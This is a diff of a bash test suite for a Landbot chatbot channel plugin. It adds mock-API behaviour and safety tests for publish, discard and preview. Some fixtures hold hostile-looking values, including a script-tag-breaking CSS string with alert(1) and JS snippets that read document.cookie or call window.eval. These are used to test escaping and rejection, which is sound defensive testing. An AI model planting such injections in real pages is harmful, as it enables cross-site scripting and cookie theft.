@@ -14,25 +14,42 @@ cat > "$T/lb" <<'E'
 #!/usr/bin/env bash
 M="$1"; P="$2"; B="${3:-}"; D="$(dirname "$0")"
 cr=$(( $(date +%s) - ${MOCK_AGE_H:-1}*3600 ))
+BASE='{"format":"fullpage","persistent_menu":[],"typing_options":{"state":true},"conditional_proactives":{},"tagline":"Start","favicon":null,"hidden_fields":{},"meta_image":null,"meta_title":"","widget_height":null,"google_analytics_id":"","fb_pixel_id":"","head":"","storage_off":false,"text":{"back":"Back"},"revisit_off":true,"revisit":[],"welcome":[],"is_legal_consent_enabled":false,"privacy_policy_link":"","privacy_policy_link_text":"","privacy_policy_text":"","launcher_config":{}}'
 case "$M $P" in
 "GET /bots/"*"/draft") cat "${MOCK_DRAFT:-$D/draft.json}";;
 "GET /bots/"*) echo "{\"data\":{\"id\":\"BOT\",\"channel_family\":\"landbot\",\"channels\":${MOCK_CHANNELS:-[\"cu-1\"]}}}";;
-"GET /channels/777/test_config/") [ -n "${MOCK_NOTESTCFG:-}" ] && exit 1; jq -n --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --arg w "$(cat "$D/dwelcome" 2>/dev/null || echo hi)" --arg tok "$RANDOM$RANDOM" --arg ch "$(cat "$D/dchat" 2>/dev/null || true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}')" '{test:true,version:$v,style:$s,foot:$f,welcome:$w,chat_placeholder:$ch,design:$dz,customerToken:$tok,landbotToken:$tok,channelToken:$tok,firestore:{api_key:$tok}}';;
+"GET /channels/777/test_config/") [ -n "${MOCK_NOTESTCFG:-}" ] && exit 1
+   dw="$(cat "$D/dwelcome" 2>/dev/null || echo hi)"
+   if [ -n "${MOCK_FLIP_DRAFT:-}" ]; then n=$(( $(cat "$D/treads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/treads"; [ "$n" -ge "$MOCK_FLIP_DRAFT" ] && echo "a builder autosave" > "$D/dchat"; fi
+   jq -n --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --arg w "$dw" --arg tok "$RANDOM$RANDOM" --arg ch "$(cat "$D/dchat" 2>/dev/null || true)" --argjson br "$(cat "$D/dbranding" 2>/dev/null || cat "$D/branding" 2>/dev/null || echo true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}')" '{test:true,version:$v,style:$s,foot:$f,welcome:$w,branding:$br,chat_placeholder:$ch,design:$dz,customerToken:$tok,landbotToken:$tok,channelToken:$tok,firestore:{api_key:$tok}}';;
+"GET /channels/777/copy/") [ -n "${MOCK_NOCOPY:-}" ] && exit 1
+   if [ -n "${MOCK_FLIP_COPY:-}" ]; then n=$(( $(cat "$D/creads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/creads"; [ "$n" -ge "$MOCK_FLIP_COPY" ] && export MOCK_COPY_HEAD="<meta name=late>"; fi
+   jq -n --argjson base "$BASE" --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "${MOCK_COPY_STYLE:-$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)}" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --argjson br "$(cat "$D/dbranding" 2>/dev/null || cat "$D/branding" 2>/dev/null || echo true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}')" --arg drop "${MOCK_COPY_DROP:-}" \
+     '{success:true,channel:($base + {id:777,uuid:"cu-1",merged:false,version:$v,style:$s,foot:$f,design:$dz,branding:$br} + (if env.MOCK_COPY_HEAD then {head: env.MOCK_COPY_HEAD} else {} end) + (if env.MOCK_COPY_IE then {ie_compat: true} else {} end) | if $drop != "" then del(.[$drop]) else . end)}';;
 "GET /channels/"*) id="${P#/channels/}"; id="${id%/}"; [ "$id" = "777" ] || exit 1
    ver=$(cat "$D/ver" 2>/dev/null || echo 3.0.0); sty=$(cat "$D/style" 2>/dev/null || true); ft=$(cat "$D/foot" 2>/dev/null || true)
    mg=$(cat "$D/merged" 2>/dev/null || echo "${MOCK_MERGED:-true}")
    if [ -n "${MOCK_FLIP_LIVE:-}" ]; then n=$(( $(cat "$D/reads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/reads"; [ "$n" -ge 2 ] && sty="moved"; fi
    if [ -n "${MOCK_FLIP:-}" ]; then n=$(( $(cat "$D/reads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/reads"; [ "$n" -ge 2 ] && mg=false; fi
    dz=$(cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}'); [ -n "${MOCK_FLIP_DESIGN:-}" ] && { n=$(( $(cat "$D/dreads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/dreads"; [ "$n" -ge 3 ] && dz='{"background_color":"#000000","header_title":"Hi"}'; }
-   jq -n --arg v "$ver" --arg s "$sty" --arg f "$ft" --arg cfg "${MOCK_CFG:-}" --argjson c "$cr" --arg mg "$mg" --argjson dz "$dz" '{success:true,channel:({id:777,uuid:"cu-1",version:$v,style:$s,foot:$f,created_at:$c,design:$dz} + (if $mg == "none" then {} else {merged:($mg == "true")} end) + (if $cfg != "" then {config_url:$cfg} else {} end))}';;
-"PATCH /channels/777/discard/") echo discard >> "$D/patches"; echo true > "$D/merged"; rm -f "$D/dver" "$D/dstyle" "$D/dfoot" "$D/dwelcome"
+   jq -n --argjson base "$BASE" --argjson lj "$(cat "$D/live.json" 2>/dev/null || echo '{}')" --argjson br "$(cat "$D/branding" 2>/dev/null || echo true)" --arg v "$ver" --arg s "$sty" --arg f "$ft" --arg cfg "${MOCK_CFG-file://$D/pub.json}" --argjson c "$cr" --arg mg "$mg" --argjson dz "$dz" '{success:true,channel:($base + $lj + {id:777,uuid:"cu-1",version:$v,style:$s,foot:$f,created_at:$c,design:$dz,branding:$br} + (if $mg == "none" then {} else {merged:($mg == "true")} end) + (if $cfg != "" then {config_url:$cfg} else {} end))}';;
+"PATCH /channels/777/discard/") echo discard >> "$D/patches"; echo true > "$D/merged"; rm -f "$D/dver" "$D/dstyle" "$D/dfoot" "$D/dwelcome" "$D/dbranding"
    echo '{"success":true,"channel":{"id":777,"merged":false}}';;
 "PATCH /channels/777/") printf '%s' "$B" | jq -c . >> "$D/patches"
-   if printf '%s' "$B" | jq -e '.autosave == true' >/dev/null; then pre=d; echo false > "$D/merged"; else pre=; echo true > "$D/merged"; fi
+   if printf '%s' "$B" | jq -e '.autosave == true' >/dev/null; then pre=d; echo false > "$D/merged"; else pre=; echo true > "$D/merged"
+     # a live PATCH: the channel keeps every field sent (MOCK_PUBLISH_DROP: one the server ignores), and the draft follows the live channel
+     B="$(printf '%s' "$B" | jq -c --arg drop "${MOCK_PUBLISH_DROP:-}" 'if $drop != "" then del(.[$drop]) else . end')"
+     jq -c -n --argjson o "$(cat "$D/live.json" 2>/dev/null || echo '{}')" --argjson b "$B" '$o + ($b | del(.style, .foot, .version, .design, .branding))' > "$D/live.json"
+     printf '%s' "$B" | jq -e 'has("branding")' >/dev/null && printf '%s' "$B" | jq -c '.branding' > "$D/branding"
+     rm -f "$D/dbranding" "$D/dwelcome" "$D/dchat"; fi
    v=$(printf '%s' "$B" | jq -r '.version // empty'); [ -n "$v" ] && echo "$v" > "$D/${pre}ver"
    printf '%s' "$B" | jq -e 'has("style")' >/dev/null && printf '%s' "$B" | jq -j '.style | sub("\\s+$"; "")' > "$D/${pre}style"
    printf '%s' "$B" | jq -e 'has("foot")' >/dev/null && printf '%s' "$B" | jq -j '.foot | sub("\\s+$"; "")' > "$D/${pre}foot"
    printf '%s' "$B" | jq -e 'has("design")' >/dev/null && printf '%s' "$B" | jq -c '.design' > "$D/${pre}design"
+   [ -z "$pre" ] && rm -f "$D/dver" "$D/dstyle" "$D/dfoot" "$D/ddesign"
+   if [ -z "$pre" ]; then
+     jq -n --arg v "$(cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/foot" 2>/dev/null || true)" --arg nf "${MOCK_PUB_NOFOOT:-}" --arg ns "${MOCK_PUB_NOSTYLE:-}" --argjson dz "$( { [ -z "${MOCK_PUB_OLD_DESIGN:-}" ] && cat "$D/design" 2>/dev/null; } || echo '{"background_color":"#ffffff","header_title":"Hi"}')" '{version:$v,style:(if $ns != "" then "" else $s end),design:$dz,foot:(if $nf != "" then null else $f end)}' > "${MOCK_PUB:-$D/pub.json}"
+   fi
    if [ -n "$pre" ]; then
      jq -n --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{}')" '{success:true,channel:{id:777,version:$v,style:$s,foot:$f,design:$dz}}'
    else echo '{}'; fi;;
@@ -42,7 +59,7 @@ E
 printf '#!/usr/bin/env bash\necho "LANDBOT_HANDOFF bot=$1 builder=4069913 share=x channel=${MOCK_RESOLVED:-777} version=3.0.0"\n' > "$T/handoff"
 chmod +x "$T/lb" "$T/handoff" "$T/channel"; printf 'a{color:red}' > "$T/s.css"
 pass=0; fail=0
-t() { local name="$1" want="$2"; shift 2; rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat" "$T/reads" "$T/design" "$T/ddesign" "$T/dreads"; rm -rf "$T/state/channel-drafts"; "$@" >/dev/null 2>&1; local rc=$?
+t() { local name="$1" want="$2"; shift 2; rm -f "$T/patches" "$T/live.json" "$T/branding" "$T/dbranding" "$T/treads" "$T/pub.json" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat" "$T/reads" "$T/design" "$T/ddesign" "$T/dreads"; rm -rf "$T/state/channel-drafts"; "$@" >/dev/null 2>&1; local rc=$?
   local np=0; [ -f "$T/patches" ] && np=$(wc -l < "$T/patches" | tr -d ' ')
   if [ "$rc:$np" = "$want" ]; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL $name: rc=$rc writes=$np, want $want"; fi; }
 C="$T/channel"
@@ -88,7 +105,7 @@ rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyl
 "$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; [ $? = 75 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft record past its TTL was trusted"; }
 # The person edited the draft after ours (any field, unpublished): continuing and discarding both refuse.
 rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome"; rm -rf "$T/state/channel-drafts"
-"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo "edited welcome" > "$T/dwelcome"; np0=$(wc -l < "$T/patches" | tr -d ' ')
+"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo false > "$T/dbranding"; np0=$(wc -l < "$T/patches" | tr -d ' ')
 "$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; rc1=$?; "$C" discard --bot OTHER >/dev/null 2>&1; rc2=$?; np1=$(wc -l < "$T/patches" | tr -d ' ')
 [ "$rc1:$rc2:$((np1-np0))" = "75:75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft edited by the person after ours was treated as ours ($rc1:$rc2:$((np1-np0)))"; }
 rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome"; rm -rf "$T/state/channel-drafts"
@@ -104,10 +121,123 @@ MOCK_FLIP_LIVE=1 "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(wc -l < 
 t "discard of someone else's draft refused" 75:0 env MOCK_MERGED=false "$C" discard --bot OTHER
 t "discard with nothing pending"  0:0 "$C" discard --bot OTHER
 t "draft js skips the served check" 0:1 "$C" js "$TROOT/landbot-style/modules/messaging.js" --bot OTHER
+# channel publish: only our own draft, every field explicit, re-read before the write, verified after
+rs() { rm -f "$T/creads" "$T/patches" "$T/live.json" "$T/branding" "$T/dbranding" "$T/treads" "$T/pub.json" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat" "$T/reads" "$T/design" "$T/ddesign" "$T/dreads"; rm -rf "$T/state/channel-drafts" "$T/state/backups"; }
+npat() { [ -f "$T/patches" ] && wc -l < "$T/patches" | tr -d ' ' || echo 0; }
+FIELDS='["format","foot","persistent_menu","typing_options","conditional_proactives","tagline","favicon","hidden_fields","meta_image","meta_title","widget_height","google_analytics_id","fb_pixel_id","head","storage_off","style","text","revisit_off","revisit","branding","welcome","is_legal_consent_enabled","privacy_policy_link","privacy_policy_link_text","privacy_policy_text","launcher_config","version","design"]'
+PUBENV="MOCK_CFG=file://$T/pub.json MOCK_PUB=$T/pub.json"
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "0:1" ] \
+  && tail -1 "$T/patches" | jq -e --argjson f "$FIELDS" '(has("autosave") | not) and (keys | length) == 28 and ([$f[] as $k | has($k)] | all) and .style == "a{color:red}"' >/dev/null \
+  && [ "$(cat "$T/merged")" = "true" ] && [ "$(cat "$T/style")" = "a{color:red}" ] && [ ! -f "$T/state/channel-drafts/777" ] \
+  && jq -e --argjson f "$FIELDS" '(keys | length) == 28 and ([$f[] as $k | has($k)] | all)' "$(ls "$T/state/backups"/channel-777-live-* | sed -n 1p)" >/dev/null; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our own draft: rc=$rc writes=$((np1-np0)), want 0:1 with 28 explicit fields, merged, record gone, live backup kept"; }
+t "publish over someone else's draft refused" 75:0 env MOCK_MERGED=false "$C" publish --bot OTHER
+t "publish over someone else's draft on a bot made here refused" 75:0 env MOCK_MERGED=false "$C" publish --bot BOT
+t "publish with nothing pending does nothing" 0:0 "$C" publish --bot OTHER
+t "publish without --bot"                    64:0 "$C" publish 777
+# false, "" and null in the draft go out explicitly, so Landbot cannot refill them from the live channel
+rs; printf 'live{}' > "$T/style"; echo false > "$T/branding"; : > "$T/empty.css"
+"$C" css "$T/empty.css" --bot OTHER >/dev/null 2>&1; env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?
+{ [ "$rc" = 0 ] && tail -1 "$T/patches" | jq -e '.branding == false and .style == "" and has("favicon") and .favicon == null and .storage_off == false and .head == ""' >/dev/null \
+  && [ "$(cat "$T/branding")" = "false" ] && [ ! -s "$T/style" ]; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a false or empty draft value was not sent explicitly or came back from live (rc=$rc)"; }
+# a flow publish rewrites the greeting on the live channel and the draft alike: still our draft, and publish sends the LIVE greeting
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo '{"welcome":[{"title":"flow v2"}]}' > "$T/live.json"; echo "flow v2" > "$T/dwelcome"; np0=$(npat)
+env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.welcome == [{"title":"flow v2"}] and .style == "a{color:red}"' >/dev/null; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish after a flow publish: refused our draft or sent the draft's greeting ($rc:$((np1-np0)))"; }
+# only what this plugin wrote comes from the draft; anything else that differs from live is someone else's edit
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_COPY_HEAD='<meta name="x">' "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with someone's page-head edit in the draft (not in the fingerprint) ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_COPY_HEAD='<meta name="x">' "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard would throw away someone's page-head edit ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_COPY_IE=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with ie_compat differing between draft and live ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; rm -f "$T/state/channel-drafts/777.keys"; np0=$(npat)
+"$C" publish --bot OTHER >/dev/null 2>"$T/pub.err"; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && grep -F 'no record of which settings' "$T/pub.err" >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of a draft with no record of what we wrote ($rc:$((np1-np0)))"; }
+rs; echo '{"background_color":"#111111","header_title":"old"}' > "$T/ddesign"; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.design == {"background_color":"#ffffff","header_title":"Hi"} and .style == "a{color:red}"' >/dev/null; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish sent a stale draft design this plugin did not write ($rc:$((np1-np0)))"; }
+rs; "$C" back off --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.design.back_button_visible == false and .design.header_title == "Hi"' >/dev/null && [ "$(jq -r '.back_button_visible | tostring' "$T/design")" = "false" ]; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft ($rc:$((np1-np0)))"; }
+rs; "$C" back off --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV MOCK_PUB_OLD_DESIGN=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "5:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft while the published config still serves the old design ($rc:$((np1-np0)))"; }
+rs; "$C" back off --bot OTHER >/dev/null 2>&1; echo '{"background_color":"#000000","header_title":"Hi"}' > "$T/design"; np0=$(npat)
+"$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft after the live design moved ($rc:$((np1-np0)))"; }
+# someone edits a setting the draft fingerprint does not see, after the check and before the write: nothing is written
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_FLIP_COPY=2 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when a copy-only setting moved before the write ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_FLIP_COPY=2 "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard when a copy-only setting moved before the write ($rc:$((np1-np0)))"; }
+# the draft moves between the reads (a builder autosave): nothing is written
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_FLIP_DRAFT=3 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when the draft moved before the write ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_COPY_STYLE='other{}' "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when the copy and the previewed draft disagree ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_COPY_DROP=branding "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "70:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with a field missing from the draft copy ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_NOCOPY=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "1:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with an unreadable draft copy ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; r="$T/state/channel-drafts/777"; printf '%s %s %s\n' $(( $(date +%s) - 7*3600 )) "$(awk '{print $2}' "$r")" "$(awk '{print $3}' "$r")" > "$r"; np0=$(npat)
+"$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our draft past its TTL ($rc:$((np1-np0)))"; }
+# after the write: a field the live channel did not take, and Custom JS the account does not serve
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV MOCK_PUBLISH_DROP=style "$C" publish --bot OTHER >/dev/null 2>"$T/pub.err"; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "1:1" ] && grep -F 'NOT VERIFIED' "$T/pub.err" >/dev/null && grep -F 'in: style' "$T/pub.err" >/dev/null && grep -F 'PATCH /channels/777/ @' "$T/pub.err" >/dev/null; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a publish the live channel did not fully take was not reported with the undo ($rc:$((np1-np0)))"; }
+rs; "$C" js "$TROOT/landbot-style/modules/messaging.js" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+env $PUBENV MOCK_PUB_NOFOOT=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "3:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of Custom JS the published config does not carry ($rc:$((np1-np0)))"; }
+rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_CFG= "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
+[ "$rc:$((np1-np0))" = "4:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish without a config url was not flagged unverified ($rc:$((np1-np0)))"; }
+# channel preview: reads only; the draft's look over the published config; no draft token; nothing closes the <script>
+jq -n '{channelToken:"H-777-PUB",version:"3.1.0",style:"live{}",foot:"",welcome:[{"title":"published greeting"}],design:{"header_title":"Hi"},firestore:{api_key:"public"}}' > "$T/pubcfg.json"
+pvcfg() { sed -n 's/^var LB_PREVIEW_CONFIG = \(.*\);$/\1/p' "$1"; }
+rs; printf 'a{color:red}</script><script>alert(1)</script>' > "$T/x.css"; "$C" css "$T/x.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
+MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv.html" >/dev/null 2>&1; rc=$?; np1=$(npat)
+{ [ "$rc:$((np1-np0))" = "0:0" ] && pvcfg "$T/pv.html" | jq -e '.style == "a{color:red}</script><script>alert(1)</script>" and .welcome[0].title == "published greeting" and .channelToken == "H-777-PUB" and .firestore.api_key == "public" and (has("customerToken") or has("landbotToken") | not)' >/dev/null \
+  && [ "$(grep -o '</script>' "$T/pv.html" | wc -l | tr -d ' ')" = 2 ] && grep -F 'new Landbot.Native(LB_PREVIEW_CONFIG)' "$T/pv.html" >/dev/null; } \
+  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview of our draft ($rc:$((np1-np0)))"; }
+rs; MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv2.html" >/dev/null 2>&1; rc=$?
+{ [ "$rc" = 0 ] && pvcfg "$T/pv2.html" | jq -e '.style == "live{}"' >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview with nothing pending does not show the published look (rc=$rc)"; }
+rs; MOCK_MERGED=false MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv3.html" >/dev/null 2>&1; rc=$?
+[ "$rc:$(npat)" = "0:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview of someone else's draft is a read and must work (rc=$rc)"; }
+t "preview without a config url"  1:0 "$C" preview --bot OTHER --out "$T/pv4.html"
+t "--out on another command"     64:0 "$C" css "$T/s.css" --bot OTHER --out "$T/x.html"
+for sk in "$HERE/plugins/landbot/skills/"*/SKILL.md; do
+  # the allowed-tools value: from its key to the next top-level key of the front matter (one line or several)
+  at="$(awk 'NR == 1 && /^---$/ {f=1; next} f && /^---$/ {exit} f && /^allowed-tools:/ {a=1; print; next} a && /^[A-Za-z_-]+:/ {a=0} a {print}' "$sk")"
+  ents="$(printf '%s\n' "$at" | grep -oE 'Bash\([^)]*\)' )"
+  nch="$(printf '%s\n' "$ents" | grep -c 'scripts/channel')"; ngood="$(printf '%s\n' "$ents" | grep -cE 'scripts/channel" get \*\)$')"
+  { [ -n "$ents" ] && [ "$nch" -ge 1 ] && [ "$nch" = "$ngood" ] && ! printf '%s\n' "$ents" | grep -qE '^Bash\(\*\)$|scripts/"?\*|/\*\)$'; } \
+    && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL $(basename "$(dirname "$sk")"): allowed-tools pre-approves a channel write or a wildcard ($nch channel entries, $ngood read-only)"; }
+done
 t "channel not resolvable"     1:0 env MOCK_RESOLVED='?' "$C" v4 --bot BOT
 t "v4"                         0:1 "$C" v4 --bot BOT
 t "css"                        0:1 "$C" css "$T/s.css" --bot BOT
 printf 'a{color:red}\n\n' > "$T/nl.css"
+t "live css: the published config must carry it"        0:1 "$C" css "$T/s.css" --bot BOT
+t "live css the published config drops (Sandbox): not live" 5:1 env MOCK_PUB_NOSTYLE=1 "$C" css "$T/s.css" --bot BOT
+t "live css without a config url: not verified"          4:1 env MOCK_CFG= "$C" css "$T/s.css" --bot BOT
+t "live v4 served"                                        0:1 "$C" v4 --bot BOT
 t "css ending in newlines"     0:1 "$C" css "$T/nl.css" --bot BOT
 t "v4 <id> --bot (0.3.1 form)" 0:1 "$C" v4 777 --bot BOT
 t "css <id> <file> --bot (0.3.1 form)" 0:1 "$C" css 777 "$T/s.css" --bot BOT
@@ -125,7 +255,7 @@ printf '/* lb-js: t */\nvar c = document.cookie;\n' > "$T/cookie.js"
 printf '/* lb-js: t */\nwindow.eval("1");\n' > "$T/eval.js"
 printf '<script src="https://cdn.example.com/x.js"></script>\n/* lb-js: t */\n' > "$T/src.js"
 { printf '/* lb-js: big */\n'; head -c 61000 /dev/zero | tr '\0' 'a'; } > "$T/big.js"
-t "custom js without a config url is not verified" 4:1 "$C" js "$T/ok.js" --bot BOT --custom
+t "custom js without a config url is not verified" 4:1 env MOCK_CFG= "$C" js "$T/ok.js" --bot BOT --custom
 t "custom js without --custom refused" 65:0 "$C" js "$T/ok.js" --bot BOT
 t "js without marker"         65:0 "$C" js "$T/nomark.js" --bot BOT --custom
 t "js with #{"                65:0 "$C" js "$T/hash.js" --bot BOT --custom
@@ -150,15 +280,15 @@ M="$TROOT/landbot-style/modules"
 sed 's/total: 5, /total: 3, /' "$M/steps.js" > "$T/steps-cfg.js"
 sed 's/total: 5, /total: (function(){ return 3; })(), /' "$M/steps.js" > "$T/steps-fn.js"
 sed 's/var total = Math.max/var total = 1 + Math.max/' "$M/steps.js" > "$T/steps-code.js"
